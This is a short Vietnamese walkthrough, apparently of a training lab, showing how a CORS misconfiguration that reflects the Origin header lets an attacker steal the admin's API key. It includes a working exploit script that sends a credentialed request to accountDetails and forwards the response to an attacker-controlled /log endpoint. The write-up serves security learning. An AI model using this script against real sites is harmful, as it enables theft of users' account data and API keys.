![image](https://github.com/user-attachments/assets/4ab58d48-d796-4b4e-af14-c877d559191b)

Mục tiêu: lấy được api key của admin

Lỗ hổng: Tiêu đề ACAO do máy chủ tạo ra từ tiêu đề Origin do máy khách chỉ định

Mở phần burpsuite lên, dán vào và check phần accountDetails:

![image](https://github.com/user-attachments/assets/b80d2699-193e-468b-88ea-162593b34ab1)

Ở đây thấy phần reponse là true nên thử thêm phần Origin xem như nào 

![image](https://github.com/user-attachments/assets/acdcdfb2-3196-43f1-9c99-b5229b6eb0e2)

Như vậy có nghĩa là bất cứ tên miền nào cx có thể tấn công nên sẽ dùng đoạn script sau 

            <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0aaf00ab04c94be382db29ec00e100f9.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
    </script>


Thử lần lượt với view exploit, deliver để xem như nào 

![image](https://github.com/user-attachments/assets/ff3a8083-d88b-4598-bae2-f6c154dc9503)

Thử nhìn kĩ thì có vẻ đã thấy phần admin nên lấy luôn api key của nó 

![image](https://github.com/user-attachments/assets/bcec7114-597a-468c-a4b4-dbaa9713edcc)
